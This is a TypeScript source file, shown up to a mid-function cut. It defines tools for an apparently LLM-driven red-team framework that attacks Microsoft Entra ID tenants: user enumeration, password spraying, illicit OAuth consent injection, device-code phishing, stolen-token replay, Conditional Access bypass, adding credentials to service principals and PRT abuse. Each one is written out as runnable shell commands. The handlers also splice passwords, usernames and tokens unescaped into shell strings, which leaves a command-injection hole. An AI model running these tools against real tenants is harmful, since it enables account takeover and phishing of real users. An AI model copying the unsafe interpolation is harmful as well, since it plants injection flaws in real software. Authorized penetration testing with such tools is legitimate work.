import { executeInKali } from "../utils/docker-exec";

// =============================================================================
// IDENTITY — Microsoft Entra ID (Azure AD) tools
//
// Mirrors the cloud-recon.ts / cloud-iam.ts pattern exactly:
//   - each tool builds a commands[] array, joins with " && ", returns raw output
//   - tool-availability preflight (command -v ... && echo "INSTALLED" || "NOT INSTALLED")
//   - 2>&1 (NOT 2>/dev/null) so real auth errors surface (the cloud W1b lesson)
//
// PowerShell-only modules (MSOLSpray, GraphRunner, TokenTactics, AADInternals)
// are cloned to /opt/identity-ps and invoked via `pwsh -Command`. Python tools
// (roadrecon, roadtx, o365spray) live in the /opt/identity-tools venv and are
// symlinked onto PATH.
//
// Every tool takes `tenant_id` so the parent scope validator can pin it to the
// in-scope Entra tenant (the identity analog of cloud's `cloud_account_id`).
//
// SAFETY (the Lockout Mandate, §15.1): password_spray_entra REQUIRES an explicit
// `lockout_threshold`, sprays <= threshold - margin, 1 attempt/user/window, adds
// jitter, and aborts on first observed lockout. Default is SAFE (1 attempt).
//
// NON-DESTRUCTIVE DEFAULTS: every write / persistence / consent-grant / token-mint
// op is gated behind an explicit `attempt_*: boolean` defaulting to false
// (mirrors cloud's attempt_write / attempt_exploitation).
// =============================================================================

const PS_DIR = "/opt/identity-ps";

export const identityEntraTools = [
  // ---------------------------------------------------------------------------
  // RECON (deterministic)
  // ---------------------------------------------------------------------------
  {
    name: "enum_entra_tenant",
    description:
      "Unauthenticated Entra tenant fingerprint: federation realm (getuserrealm), OIDC .well-known config, tenant ID, branding, and namespace type (Managed vs Federated). No auth required.",
    inputSchema: {
      type: "object",
      properties: {
        tenant_id: {
          type: "string",
          description: "Entra tenant ID or tenant domain (e.g. corp.onmicrosoft.com) for scope validation",
        },
        tenant_domain: {
          type: "string",
          description: "A domain in the tenant used to drive getuserrealm / autodiscover (e.g. corp.com)",
        },
      },
      required: ["tenant_id"],
    },
  },
  {
    name: "enum_entra_users",
    description:
      "Validate which users/emails exist in a tenant via o365spray --enum / AADInternals user enumeration (login-based existence oracle). Recon only — no password attempts.",
    inputSchema: {
      type: "object",
      properties: {
        tenant_id: {
          type: "string",
          description: "Entra tenant ID or domain for scope validation",
        },
        tenant_domain: {
          type: "string",
          description: "Tenant domain to enumerate against (e.g. corp.onmicrosoft.com)",
        },
        userlist: {
          type: "array",
          items: { type: "string" },
          description: "Candidate usernames/emails to test for existence",
        },
      },
      required: ["tenant_id", "userlist"],
    },
  },
  {
    name: "enum_entra_directory",
    description:
      "Authenticated directory enumeration via roadrecon gather + analyze: users, groups, service principals, app registrations, directory roles, and ownership. Recon only.",
    inputSchema: {
      type: "object",
      properties: {
        tenant_id: {
          type: "string",
          description: "Entra tenant ID for scope validation",
        },
        client_id: {
          type: "string",
          description: "Service principal app/client ID for authentication",
        },
        client_secret: {
          type: "string",
          description: "Service principal client secret (brokered, short-lived)",
        },
      },
      required: ["tenant_id"],
    },
  },
  {
    name: "enum_conditional_access",
    description:
      "Enumerate Conditional Access policies (named locations, device/MFA conditions, app exclusions, legacy-auth grants) to find the gaps that token replay / CA bypass can exploit.",
    inputSchema: {
      type: "object",
      properties: {
        tenant_id: {
          type: "string",
          description: "Entra tenant ID for scope validation",
        },
        access_token: {
          type: "string",
          description: "A directory-read Graph access token (brokered)",
        },
      },
      required: ["tenant_id"],
    },
  },
  {
    name: "enum_oauth_apps",
    description:
      "List app registrations, service principals, and delegated/application OAuth permission grants — illicit-consent candidate enumeration. Recon only.",
    inputSchema: {
      type: "object",
      properties: {
        tenant_id: {
          type: "string",
          description: "Entra tenant ID for scope validation",
        },
        access_token: {
          type: "string",
          description: "A directory-read Graph access token (brokered)",
        },
      },
      required: ["tenant_id"],
    },
  },

  // ---------------------------------------------------------------------------
  // EXPLOITATION (LLM-driven)
  // ---------------------------------------------------------------------------
  {
    name: "password_spray_entra",
    description:
      "Lockout-aware Entra password spray (MSOLSpray/o365spray) that respects Smart Lockout: <= lockout_threshold - safety_margin attempts, 1 attempt per user per window, jitter between sprays, abort on first observed lockout. SAFE by default (1 attempt). REQUIRES lockout_threshold.",
    inputSchema: {
      type: "object",
      properties: {
        tenant_id: {
          type: "string",
          description: "Entra tenant ID for scope validation",
        },
        userlist: {
          type: "array",
          items: { type: "string" },
          description: "Usernames/emails to spray (spray ACROSS users, never DOWN one account)",
        },
        password: {
          type: "string",
          description: "The single password to try across all users this window",
        },
        lockout_threshold: {
          type: "number",
          description: "MANDATORY — the tenant Smart Lockout threshold. The spray stays at least safety_margin attempts below this. No safe default is guessed.",
        },
        safety_margin: {
          type: "number",
          description: "Attempts to stay below the lockout threshold (default 2)",
          default: 2,
        },
        attempts_per_user: {
          type: "number",
          description: "Attempts per user per window. Default 1 (SAFE). Capped at lockout_threshold - safety_margin.",
          default: 1,
        },
        jitter_seconds: {
          type: "number",
          description: "Random delay seconds between per-user attempts (default 30)",
          default: 30,
        },
        abort_on_lockout: {
          type: "boolean",
          description: "Halt the entire spray on first observed lockout (default true — do not disable)",
          default: true,
        },
      },
      required: ["tenant_id", "userlist", "password", "lockout_threshold"],
    },
  },
  {
    name: "abuse_consent_grant",
    description:
      "Illicit consent grant / OAuth app abuse via GraphRunner Invoke-InjectOAuthApp — register/abuse an app to obtain delegated Graph scopes. WRITE op: creates a real app registration only when attempt_consent=true (default false).",
    inputSchema: {
      type: "object",
      properties: {
        tenant_id: {
          type: "string",
          description: "Entra tenant ID for scope validation",
        },
        access_token: {
          type: "string",
          description: "A Graph access token with app-registration rights (brokered)",
        },
        app_name: {
          type: "string",
          description: "Display name for the injected OAuth app",
          default: "maestro-consent-test",
        },
        scopes: {
          type: "array",
          items: { type: "string" },
          description: "Delegated Graph scopes to request (e.g. ['Mail.Read','Files.Read.All'])",
        },
        attempt_consent: {
          type: "boolean",
          description: "Actually create the app registration / consent grant (default false = dry-run candidate analysis only)",
          default: false,
        },
      },
      required: ["tenant_id"],
    },
  },
  {
    name: "device_code_phish",
    description:
      "Device-code phishing emulation via TokenTactics/GraphRunner Invoke-DeviceCodeFlow — request a real device code and poll for token acquisition. Involves a victim: only initiates the flow when attempt_phish=true (default false).",
    inputSchema: {
      type: "object",
      properties: {
        tenant_id: {
          type: "string",
          description: "Entra tenant ID for scope validation",
        },
        client_id: {
          type: "string",
          description: "Public client app ID to request the device code for (e.g. Microsoft Office)",
          default: "d3590ed6-52b3-4102-aeff-aad2292ab01c",
        },
        resource: {
          type: "string",
          description: "Resource/scope to request a token for (default Microsoft Graph)",
          default: "https://graph.microsoft.com",
        },
        attempt_phish: {
          type: "boolean",
          description: "Actually initiate the device-code flow that delivers a real code (default false)",
          default: false,
        },
      },
      required: ["tenant_id"],
    },
  },
  {
    name: "replay_entra_token",
    description:
      "Token theft/replay via roadtx — replay a stolen/issued access+refresh token against Graph, test Continuous Access Evaluation (CAE) and refresh-token rotation. Read-only by default.",
    inputSchema: {
      type: "object",
      properties: {
        tenant_id: {
          type: "string",
          description: "Entra tenant ID for scope validation",
        },
        access_token: {
          type: "string",
          description: "The access token to replay (brokered/stolen)",
        },
        refresh_token: {
          type: "string",
          description: "Optional refresh token to test rotation/CAE",
        },
        attempt_refresh: {
          type: "boolean",
          description: "Attempt to exchange the refresh token for a new access token (default false)",
          default: false,
        },
      },
      required: ["tenant_id", "access_token"],
    },
  },
  {
    name: "test_ca_bypass",
    description:
      "Conditional Access bypass — pivot User-Agent / device-compliance / location to slip a held token past a CA gap found in enum_conditional_access. Non-destructive (probes only).",
    inputSchema: {
      type: "object",
      properties: {
        tenant_id: {
          type: "string",
          description: "Entra tenant ID for scope validation",
        },
        access_token: {
          type: "string",
          description: "A held access token to test CA enforcement against",
        },
        user_agents: {
          type: "array",
          items: { type: "string" },
          description: "User-Agent strings to pivot through (e.g. legacy clients, mobile, desktop)",
        },
      },
      required: ["tenant_id", "access_token"],
    },
  },
  {
    name: "abuse_service_principal",
    description:
      "Service principal abuse via roadtx/Graph — add a client secret/cert to an SP the identity owns, or abuse SP owner rights to escalate. WRITE op: adds a credential only when attempt_cred_add=true (default false).",
    inputSchema: {
      type: "object",
      properties: {
        tenant_id: {
          type: "string",
          description: "Entra tenant ID for scope validation",
        },
        access_token: {
          type: "string",
          description: "A Graph token with application-write rights (brokered)",
        },
        sp_object_id: {
          type: "string",
          description: "Object ID of the target service principal / app registration",
        },
        attempt_cred_add: {
          type: "boolean",
          description: "Actually add a client secret/cert to the SP (default false = enumerate owned/abusable SPs only)",
          default: false,
        },
      },
      required: ["tenant_id"],
    },
  },
  {
    name: "forge_prt",
    description:
      "Primary Refresh Token (PRT) request/abuse via roadtx/AADInternals to mint tokens as the user. Multi-step / host-context dependent: only attempts derivation when attempt_prt=true (default false); Linux-container limits documented as PARTIAL.",
    inputSchema: {
      type: "object",
      properties: {
        tenant_id: {
          type: "string",
          description: "Entra tenant ID for scope validation",
        },
        refresh_token: {
          type: "string",
          description: "A refresh token / device context to derive the PRT from (brokered)",
        },
        device_cert: {
          type: "string",
          description: "Path to a device certificate (PFX) if a registered-device context is available",
        },
        attempt_prt: {
          type: "boolean",
          description: "Actually attempt PRT derivation/token mint (default false)",
          default: false,
        },
      },
      required: ["tenant_id"],
    },
  },
  {
    name: "test_cross_tenant",
    description:
      "Cross-tenant / guest (B2B) abuse — enumerate and read cross-tenant resources reachable from an in-scope guest identity. Read-only.",
    inputSchema: {
      type: "object",
      properties: {
        tenant_id: {
          type: "string",
          description: "The in-scope (home) Entra tenant ID for scope validation",
        },
        access_token: {
          type: "string",
          description: "A guest/B2B access token (brokered)",
        },
        foreign_tenant_id: {
          type: "string",
          description: "The external tenant ID to probe cross-tenant reachability into",
        },
      },
      required: ["tenant_id", "access_token"],
    },
  },
];

export const identityEntraHandlers: Record<string, Function> = {
  // ---------------------------------------------------------------------------
  // RECON
  // ---------------------------------------------------------------------------
  enum_entra_tenant: async (args: {
    tenant_id: string;
    tenant_domain?: string;
  }) => {
    const { tenant_id, tenant_domain } = args;
    const domain = tenant_domain || tenant_id;

    const commands: string[] = [
      `echo "=== Entra Tenant Fingerprint (unauthenticated) ==="`,
      `echo "Tenant: ${tenant_id}"`,
      `echo "Domain: ${domain}"`,
      `echo ""`,
      `echo "--- Tool availability ---"`,
      `command -v roadrecon >/dev/null 2>&1 && echo "roadrecon: INSTALLED ($(roadrecon --help 2>&1 | head -1))" || echo "roadrecon: NOT INSTALLED"`,
      `command -v curl >/dev/null 2>&1 && echo "curl: INSTALLED" || echo "curl: NOT INSTALLED"`,
      `echo ""`,
      `echo "--- getuserrealm (federation / namespace type) ---"`,
      `curl -sS "https://login.microsoftonline.com/getuserrealm.srf?login=user@${domain}&xml=1" 2>&1 || echo "getuserrealm request FAILED (see stderr above)"`,
      `echo ""`,
      `echo "--- OpenID Connect .well-known config ---"`,
      `curl -sS "https://login.microsoftonline.com/${domain}/.well-known/openid-configuration" 2>&1 | head -c 8000 || echo "OIDC config request FAILED (see stderr above)"`,
      `echo ""`,
      `echo "--- Tenant ID from issuer ---"`,
      `curl -sS "https://login.microsoftonline.com/${domain}/.well-known/openid-configuration" 2>&1 | grep -oE 'login.microsoftonline.com/[0-9a-f-]{36}' | head -1 || echo "Could not extract tenant GUID"`,
      `echo ""`,
      `echo "--- User realm (JSON) ---"`,
      `curl -sS "https://login.microsoftonline.com/common/userrealm/user@${domain}?api-version=1.0" 2>&1 || echo "userrealm JSON request FAILED (see stderr above)"`,
      `echo ""`,
      `echo "=== Entra Tenant Fingerprint Complete ==="`,
    ];

    return await executeInKali(commands.join(" && "));
  },

  enum_entra_users: async (args: {
    tenant_id: string;
    tenant_domain?: string;
    userlist: string[];
  }) => {
    const { tenant_id, tenant_domain, userlist } = args;
    const domain = tenant_domain || tenant_id;

    const commands: string[] = [
      `echo "=== Entra User/Email Enumeration ==="`,
      `echo "Tenant: ${tenant_id}"`,
      `echo "Domain: ${domain}"`,
      `echo "Candidates: ${userlist.length}"`,
      `echo ""`,
      `echo "--- Tool availability ---"`,
      `command -v o365spray >/dev/null 2>&1 && echo "o365spray: INSTALLED" || echo "o365spray: NOT INSTALLED"`,
      `command -v pwsh >/dev/null 2>&1 && echo "pwsh: INSTALLED ($(pwsh -v 2>&1 | head -1))" || echo "pwsh: NOT INSTALLED"`,
      `echo ""`,
      `printf '%s\\n' ${userlist.map((u) => `'${u}'`).join(" ")} > /tmp/entra-users.txt`,
      `echo "--- o365spray user enumeration (--enum, no password attempts) ---"`,
      `o365spray --enum --userfile /tmp/entra-users.txt --domain ${domain} 2>&1 || echo "o365spray enum FAILED (see stderr above; auth not required for enum, so this is tool/network)"`,
      `echo ""`,
      `echo "=== Entra User Enumeration Complete ==="`,
    ];

    return await executeInKali(commands.join(" && "));
  },

  enum_entra_directory: async (args: {
    tenant_id: string;
    client_id?: string;
    client_secret?: string;
  }) => {
    const { tenant_id, client_id, client_secret } = args;

    const authFlags =
      client_id && client_secret
        ? ` --tenant ${tenant_id} --client ${client_id} --password ${client_secret}`
        : "";

    const commands: string[] = [
      `echo "=== Entra Directory Enumeration (roadrecon) ==="`,
      `echo "Tenant: ${tenant_id}"`,
      `echo ""`,
      `echo "--- Tool availability ---"`,
      `command -v roadrecon >/dev/null 2>&1 && echo "roadrecon: INSTALLED" || echo "roadrecon: NOT INSTALLED"`,
      `echo ""`,
      `echo "--- roadrecon auth ---"`,
      `roadrecon auth${authFlags} 2>&1 || echo "roadrecon auth FAILED (see stderr above; auth vs not-installed)"`,
      `echo ""`,
      `echo "--- roadrecon gather (full directory) ---"`,
      `roadrecon gather 2>&1 || echo "roadrecon gather FAILED (see stderr above)"`,
      `echo ""`,
      `echo "--- roadrecon dump: users ---"`,
      `roadrecon dump 2>&1 | head -c 30000 || echo "roadrecon dump FAILED (see stderr above)"`,
      `echo ""`,
      `echo "--- Service principals / app registrations (from roadrecon DB) ---"`,
      `ls -la roadrecon.db 2>&1 || echo "roadrecon.db not present (gather may have failed)"`,
      `echo ""`,
      `echo "=== Entra Directory Enumeration Complete ==="`,
    ];

    return await executeInKali(commands.join(" && "));
  },

  enum_conditional_access: async (args: {
    tenant_id: string;
    access_token?: string;
  }) => {
    const { tenant_id, access_token } = args;

    const authHeader = access_token
      ? `-H "Authorization: Bearer ${access_token}"`
      : "";

    const commands: string[] = [
      `echo "=== Conditional Access Policy Enumeration ==="`,
      `echo "Tenant: ${tenant_id}"`,
      `echo ""`,
      `echo "--- Tool availability ---"`,
      `command -v curl >/dev/null 2>&1 && echo "curl: INSTALLED" || echo "curl: NOT INSTALLED"`,
      `command -v roadrecon >/dev/null 2>&1 && echo "roadrecon: INSTALLED" || echo "roadrecon: NOT INSTALLED"`,
      `echo ""`,
      `echo "--- Conditional Access policies (Graph beta) ---"`,
      `curl -sS ${authHeader} "https://graph.microsoft.com/beta/identity/conditionalAccess/policies" 2>&1 | head -c 30000 || echo "CA policy request FAILED (see stderr above; needs a directory-read token)"`,
      `echo ""`,
      `echo "--- Named locations ---"`,
      `curl -sS ${authHeader} "https://graph.microsoft.com/beta/identity/conditionalAccess/namedLocations" 2>&1 | head -c 15000 || echo "Named locations request FAILED (see stderr above)"`,
      `echo ""`,
      `echo "=== Conditional Access Enumeration Complete ==="`,
    ];

    return await executeInKali(commands.join(" && "));
  },

  enum_oauth_apps: async (args: {
    tenant_id: string;
    access_token?: string;
  }) => {
    const { tenant_id, access_token } = args;

    const authHeader = access_token
      ? `-H "Authorization: Bearer ${access_token}"`
      : "";

    const commands: string[] = [
      `echo "=== OAuth App / Service Principal Grant Enumeration ==="`,
      `echo "Tenant: ${tenant_id}"`,
      `echo ""`,
      `echo "--- Tool availability ---"`,
      `command -v curl >/dev/null 2>&1 && echo "curl: INSTALLED" || echo "curl: NOT INSTALLED"`,
      `echo ""`,
      `echo "--- App registrations ---"`,
      `curl -sS ${authHeader} "https://graph.microsoft.com/v1.0/applications" 2>&1 | head -c 20000 || echo "applications request FAILED (see stderr above)"`,
      `echo ""`,
      `echo "--- Service principals ---"`,
      `curl -sS ${authHeader} "https://graph.microsoft.com/v1.0/servicePrincipals?\\$top=100" 2>&1 | head -c 20000 || echo "servicePrincipals request FAILED (see stderr above)"`,
      `echo ""`,
      `echo "--- OAuth2 permission grants (delegated consent) ---"`,
      `curl -sS ${authHeader} "https://graph.microsoft.com/v1.0/oauth2PermissionGrants" 2>&1 | head -c 20000 || echo "oauth2PermissionGrants request FAILED (see stderr above)"`,
      `echo ""`,
      `echo "=== OAuth App Enumeration Complete ==="`,
    ];

    return await executeInKali(commands.join(" && "));
  },

  // ---------------------------------------------------------------------------
  // EXPLOITATION
  // ---------------------------------------------------------------------------
  password_spray_entra: async (args: {
    tenant_id: string;
    userlist: string[];
    password: string;
    lockout_threshold: number;
    safety_margin?: number;
    attempts_per_user?: number;
    jitter_seconds?: number;
    abort_on_lockout?: boolean;
  }) => {
    const {
      tenant_id,
      userlist,
      password,
      lockout_threshold,
      safety_margin = 2,
      attempts_per_user = 1,
      jitter_seconds = 30,
      abort_on_lockout = true,
    } = args;

    // ---- Lockout Mandate (§15.1) enforced in-handler, defense in depth ----
    const maxAllowed = lockout_threshold - safety_margin;
    if (!Number.isFinite(lockout_threshold) || lockout_threshold <= 0) {
      return JSON.stringify({
        status: "BLOCKED",
        reason: "LOCKOUT_MANDATE",
        message:
          "password_spray_entra requires a positive lockout_threshold. No safe default is guessed — spray BLOCKED.",
      });
    }
    if (maxAllowed < 1) {
      return JSON.stringify({
        status: "BLOCKED",
        reason: "LOCKOUT_MANDATE",
        message: `lockout_threshold (${lockout_threshold}) minus safety_margin (${safety_margin}) leaves < 1 safe attempt. Spray BLOCKED.`,
      });
    }
    const effectiveAttempts = Math.min(attempts_per_user, maxAllowed);

    const commands: string[] = [
      `echo "=== Entra Password Spray (lockout-aware) ==="`,
      `echo "Tenant: ${tenant_id}"`,
      `echo "Users: ${userlist.length}"`,
      `echo "Lockout threshold: ${lockout_threshold} | safety margin: ${safety_margin} | max safe: ${maxAllowed}"`,
      `echo "Attempts per user this window: ${effectiveAttempts} (1 = SAFE default)"`,
      `echo "Jitter: ${jitter_seconds}s | Abort on lockout: ${abort_on_lockout}"`,
      `echo ""`,
      `echo "--- Tool availability ---"`,
      `command -v pwsh >/dev/null 2>&1 && echo "pwsh: INSTALLED" || echo "pwsh: NOT INSTALLED"`,
      `command -v o365spray >/dev/null 2>&1 && echo "o365spray: INSTALLED" || echo "o365spray: NOT INSTALLED"`,
      `test -f ${PS_DIR}/MSOLSpray/MSOLSpray.ps1 && echo "MSOLSpray: PRESENT" || echo "MSOLSpray: NOT PRESENT (${PS_DIR}/MSOLSpray)"`,
      `echo ""`,
      `printf '%s\\n' ${userlist.map((u) => `'${u}'`).join(" ")} > /tmp/entra-spray-users.txt`,
    ];

    // Prefer o365spray's built-in rate-limit controls; one password per window,
    // count-limited per the mandate, jitter via --delay, abort handled by the
    // single-attempt cadence (one password / one window).
    commands.push(`echo "--- Spraying (1 password / window, ${effectiveAttempts} attempt(s)/user, ${jitter_seconds}s jitter) ---"`);
    commands.push(
      `o365spray --spray --userfile /tmp/entra-spray-users.txt --password '${password}' --count ${effectiveAttempts} --lockout ${lockout_threshold} --delay ${jitter_seconds} 2>&1 || echo "o365spray spray FAILED (see stderr above; falling through to MSOLSpray if present)"`
    );
    commands.push(`echo ""`);
    commands.push(`echo "--- MSOLSpray fallback (PowerShell) ---"`);
    commands.push(
      `if [ -f ${PS_DIR}/MSOLSpray/MSOLSpray.ps1 ]; then pwsh -Command "Import-Module ${PS_DIR}/MSOLSpray/MSOLSpray.ps1; Invoke-MSOLSpray -UserList /tmp/entra-spray-users.txt -Password '${password}'" 2>&1; else echo "MSOLSpray not present — skipping fallback"; fi`
    );
    commands.push(`echo ""`);
    if (abort_on_lockout) {
      commands.push(`echo "NOTE: abort_on_lockout=true — any observed lockout in output above means the spray was halted; do NOT re-run this window."`);
    }
    commands.push(`echo "=== Entra Password Spray Complete ==="`);

    return await executeInKali(commands.join(" && "));
  },

  abuse_consent_grant: async (args: {
    tenant_id: string;
    access_token?: string;
    app_name?: string;
    scopes?: string[];
    attempt_consent?: boolean;
  }) => {
    const {
      tenant_id,
      access_token,
      app_name = "maestro-consent-test",
      scopes = [],
      attempt_consent = false,
    } = args;

    const commands: string[] = [
      `echo "=== Illicit Consent Grant / OAuth App Abuse ==="`,
      `echo "Tenant: ${tenant_id}"`,
      `echo "App name: ${app_name}"`,
      `echo "Requested scopes: ${scopes.join(", ") || "(none specified)"}"`,
      `echo "Attempt consent (WRITE): ${attempt_consent}"`,
      `echo ""`,
      `echo "--- Tool availability ---"`,
      `command -v pwsh >/dev/null 2>&1 && echo "pwsh: INSTALLED" || echo "pwsh: NOT INSTALLED"`,
      `test -f ${PS_DIR}/GraphRunner/GraphRunner.ps1 && echo "GraphRunner: PRESENT" || echo "GraphRunner: NOT PRESENT (${PS_DIR}/GraphRunner)"`,
      `echo ""`,
    ];

    if (!attempt_consent) {
      commands.push(`echo "--- DRY-RUN (attempt_consent=false): enumerating consent-grant candidates only ---"`);
      const authHeader = access_token ? `-H "Authorization: Bearer ${access_token}"` : "";
      commands.push(
        `curl -sS ${authHeader} "https://graph.microsoft.com/v1.0/oauth2PermissionGrants" 2>&1 | head -c 20000 || echo "Candidate enumeration FAILED (see stderr above)"`
      );
      commands.push(`echo ""`);
      commands.push(`echo "No app registration created (set attempt_consent=true to perform the GraphRunner Invoke-InjectOAuthApp write op — user-confirm required)."`);
    } else {
      commands.push(`echo "--- WRITE: GraphRunner Invoke-InjectOAuthApp ---"`);
      const scopeArg = scopes.length ? ` -Permissions '${scopes.join(",")}'` : "";
      commands.push(
        `if [ -f ${PS_DIR}/GraphRunner/GraphRunner.ps1 ]; then pwsh -Command "Import-Module ${PS_DIR}/GraphRunner/GraphRunner.ps1; Invoke-InjectOAuthApp -AppName '${app_name}'${scopeArg}" 2>&1; else echo "GraphRunner not present — cannot perform consent-grant abuse"; fi`
      );
    }

    commands.push(`echo ""`);
    commands.push(`echo "=== Consent Grant Abuse Complete ==="`);

    return await executeInKali(commands.join(" && "));
  },

  device_code_phish: async (args: {
    tenant_id: string;
    client_id?: string;
    resource?: string;
    attempt_phish?: boolean;
  }) => {
    const {
      tenant_id,
      client_id = "d3590ed6-52b3-4102-aeff-aad2292ab01c",
      resource = "https://graph.microsoft.com",
      attempt_phish = false,
    } = args;

    const commands: string[] = [
      `echo "=== Device-Code Phishing Emulation ==="`,
      `echo "Tenant: ${tenant_id}"`,
      `echo "Client ID: ${client_id}"`,
      `echo "Resource: ${resource}"`,
      `echo "Attempt phish (delivers real code): ${attempt_phish}"`,
      `echo ""`,
      `echo "--- Tool availability ---"`,
      `command -v pwsh >/dev/null 2>&1 && echo "pwsh: INSTALLED" || echo "pwsh: NOT INSTALLED"`,
      `test -f ${PS_DIR}/TokenTactics/TokenTactics.psm1 && echo "TokenTactics: PRESENT" || echo "TokenTactics: NOT PRESENT (${PS_DIR}/TokenTactics)"`,
      `command -v curl >/dev/null 2>&1 && echo "curl: INSTALLED" || echo "curl: NOT INSTALLED"`,
      `echo ""`,
    ];

    if (!attempt_phish) {
      commands.push(`echo "--- DRY-RUN (attempt_phish=false): no device code requested ---"`);
      commands.push(`echo "Would POST to https://login.microsoftonline.com/${tenant_id}/oauth2/v2.0/devicecode for client ${client_id}."`);
      commands.push(`echo "Set attempt_phish=true to initiate the real flow (user-confirm required — involves a victim)."`);
    } else {
      commands.push(`echo "--- Initiating device-code flow ---"`);
      commands.push(
        `curl -sS -X POST "https://login.microsoftonline.com/${tenant_id}/oauth2/v2.0/devicecode" -d "client_id=${client_id}&scope=${resource}/.default offline_access" 2>&1 || echo "Device code request FAILED (see stderr above)"`
      );
      commands.push(`echo ""`);
      commands.push(`echo "--- TokenTactics (if present) ---"`);
      commands.push(
        `if [ -f ${PS_DIR}/TokenTactics/TokenTactics.psm1 ]; then pwsh -Command "Import-Module ${PS_DIR}/TokenTactics/TokenTactics.psm1; Get-AzureToken -Client MSGraph" 2>&1; else echo "TokenTactics not present — used raw devicecode endpoint above"; fi`
      );
    }

    commands.push(`echo ""`);
    commands.push(`echo "=== Device-Code Phishing Complete ==="`);

    return await executeInKali(commands.join(" && "));
  },

  replay_entra_token: async (args: {
    tenant_id: string;
    access_token: string;
    refresh_token?: string;
    attempt_refresh?: boolean;
  }) => {
    const { tenant_id, access_token, refresh_token, attempt_refresh = false } = args;

    const commands: string[] = [
      `echo "=== Entra Token Replay (roadtx) ==="`,
      `echo "Tenant: ${tenant_id}"`,
      `echo "Attempt refresh exchange: ${attempt_refresh}"`,
      `echo ""`,
      `echo "--- Tool availability ---"`,
      `command -v roadtx >/dev/null 2>&1 && echo "roadtx: INSTALLED" || echo "roadtx: NOT INSTALLED"`,
      `command -v curl >/dev/null 2>&1 && echo "curl: INSTALLED" || echo "curl: NOT INSTALLED"`,
      `echo ""`,
      `echo "--- Replay access token against Graph /me (read-only) ---"`,
      `curl -sS -H "Authorization: Bearer ${access_token}" "https://graph.microsoft.com/v1.0/me" 2>&1 | head -c 8000 || echo "Token replay against /me FAILED (see stderr above)"`,
      `echo ""`,
      `echo "--- Replay against /organization (tenant context) ---"`,
      `curl -sS -H "Authorization: Bearer ${access_token}" "https://graph.microsoft.com/v1.0/organization" 2>&1 | head -c 8000 || echo "Token replay against /organization FAILED (see stderr above)"`,
      `echo ""`,
    ];

    if (attempt_refresh && refresh_token) {
      commands.push(`echo "--- Refresh-token rotation / CAE test (roadtx) ---"`);
      commands.push(
        `roadtx refreshtokento --refresh-token '${refresh_token}' --tenant ${tenant_id} 2>&1 || echo "roadtx refresh exchange FAILED (see stderr above)"`
      );
    } else {
      commands.push(`echo "Refresh-token exchange skipped (attempt_refresh=false or no refresh_token supplied)."`);
    }

    commands.push(`echo ""`);
    commands.push(`echo "=== Entra Token Replay Complete ==="`);

    return await executeInKali(commands.join(" && "));
  },

  test_ca_bypass: async (args: {
    tenant_id: string;
    access_token: string;
    user_agents?: string[];
  }) => {
    const {
      tenant_id,
      access_token,
      user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "BAV2ROPC",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)",
      ],
    } = args;

    const commands: string[] = [
      `echo "=== Conditional Access Bypass Test ==="`,
      `echo "Tenant: ${tenant_id}"`,
      `echo "User-Agent pivots: ${user_agents.length}"`,
      `echo ""`,
      `echo "--- Tool availability ---"`,
      `command -v curl >/dev/null 2>&1 && echo "curl: INSTALLED" || echo "curl: NOT INSTALLED"`,
      `echo ""`,
    ];

    for (const ua of user_agents) {
      commands.push(`echo "--- Probing Graph /me with UA: ${ua} ---"`);
      commands.push(
        `curl -sS -A "${ua}" -H "Authorization: Bearer ${access_token}" "https://graph.microsoft.com/v1.0/me" 2>&1 | head -c 4000 || echo "Probe with UA '${ua}' FAILED (see stderr above)"`
      );
      commands.push(`echo ""`);
    }

    commands.push(`echo "NOTE: a 200 across a legacy/BAV2ROPC UA where the modern UA is CA-blocked indicates a Conditional Access gap (non-destructive probe)."`);
    commands.push(`echo "=== Conditional Access Bypass Test Complete ==="`);

    return await executeInKali(commands.join(" && "));
  },

  abuse_service_principal: async (args: {
    tenant_id: string;
    access_token?: string;
    sp_object_id?: string;
    attempt_cred_add?: boolean;
  }) => {
    const { tenant_id, access_token, sp_object_id, attempt_cred_add = false } = args;

    const authHeader = access_token ? `-H "Authorization: Bearer ${access_token}"` : "";

    const commands: string[] = [
      `echo "=== Service Principal Abuse ==="`,
      `echo "Tenant: ${tenant_id}"`,
      `echo "Target SP object ID: ${sp_object_id || "(enumerate owned SPs)"}"`,
      `echo "Attempt credential add (WRITE): ${attempt_cred_add}"`,
      `echo ""`,
      `echo "--- Tool availability ---"`,
      `command -v curl >/dev/null 2>&1 && echo "curl: INSTALLED" || echo "curl: NOT INSTALLED"`,
      `echo ""`,
    ];

    if (!attempt_cred_add) {
      commands.push(`echo "--- DRY-RUN: enumerating owned / abusable service principals ---"`);
      commands.push(
        `curl -sS ${authHeader} "https://graph.microsoft.com/v1.0/me/ownedObjects" 2>&1 | head -c 20000 || echo "ownedObjects enumeration FAILED (see stderr above)"`
      );
      commands.push(`echo ""`);
      commands.push(`echo "No credential added (set attempt_cred_add=true and supply sp_object_id to add a client secret — user-confirm required)."`);
    } else if (sp_object_id) {
      commands.push(`echo "--- WRITE: adding client secret to SP ${sp_object_id} ---"`);
      commands.push(
        `curl -sS -X POST ${authHeader} -H "Content-Type: application/json" -d '{"passwordCredential":{"displayName":"maestro-test"}}' "https://graph.microsoft.com/v1.0/servicePrincipals/${sp_object_id}/addPassword" 2>&1 | head -c 8000 || echo "addPassword FAILED (see stderr above)"`
      );
    } else {
      commands.push(`echo "attempt_cred_add=true but no sp_object_id supplied — nothing to write."`);
    }

    commands.push(`echo ""`);
    commands.push(`echo "=== Service Principal Abuse Complete ==="`);

    return await executeInKali(commands.join(" && "));
  },

  forge_prt: async (args: {
    tenant_id: string;
    refresh_token?: string;
    device_cert?: string;
    attempt_prt?: boolean;
  }) => {
    const { tenant_id, refresh_token, device_cert, attempt_prt = false } = args;

    const commands: string[] = [
      `echo "=== Primary Refresh Token (PRT) Derivation/Abuse ==="`,
      `echo "Tenant: ${tenant_id}"`,
      `echo "Device cert: ${device_cert || "(none — Linux container limits PRT derivation)"}"`,
      `echo "Attempt PRT (multi-step): ${attempt_prt}"`,
      `echo ""`,
      `echo "--- Tool availability ---"`,
      `command -v roadtx >/dev/null 2>&1 && echo "roadtx: INSTALLED" || echo "roadtx: NOT INSTALLED"`,
      `command -v pwsh >/dev/null 2>&1 && echo "pwsh: INSTALLED" || echo "pwsh: NOT INSTALLED"`,
